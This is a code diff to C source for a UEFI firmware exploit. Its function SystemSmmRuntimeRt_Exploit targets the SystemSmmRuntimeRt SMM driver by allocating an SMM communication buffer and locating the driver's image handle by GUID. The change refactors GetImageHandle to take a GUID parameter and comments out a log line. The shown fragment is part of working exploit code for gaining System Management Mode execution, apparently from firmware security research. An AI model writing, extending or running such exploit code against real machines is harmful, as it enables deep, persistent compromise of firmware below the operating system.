@@ -82,7 +82,7 @@ VOID SmmHandler(VOID *Context, VOID *Unknown, VOID *Data)
     }
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
+EFI_STATUS GetImageHandle(IN EFI_GUID *Name, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
 {
     EFI_STATUS Status;
     EFI_HANDLE *Buffer = NULL;
@@ -140,7 +140,7 @@ EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *Ha
                         MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *Path = (MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *)DevicePath;
 
                         // Compare image GUID
-                        if (!memcmp (&Path->FvFileName, &mImageName, sizeof (EFI_GUID))) {
+                        if (!memcmp (&Path->FvFileName, Name, sizeof (EFI_GUID))) {
 
                             if (HandlesFound + 1 < *HandlesListLength)
                             {
@@ -295,7 +295,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
     }
 
     printf("Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
-    printf("Obtaining %S image handles...\n", IMAGE_NAME);
+    //printf("Obtaining %g image handles...\n", &mImageName);
 
     /*
         Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
@@ -303,7 +303,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
         We can determinate this handle value using LocateHandle() function of
         EFI_BOOT_SERVICES.
     */
-    if (GetImageHandle(IMAGE_NAME, HandlesList, &HandlesListLength) == EFI_SUCCESS)
+    if (GetImageHandle(&mImageName, HandlesList, &HandlesListLength) == EFI_SUCCESS)
     {
         if (HandlesListLength > 0)
         {
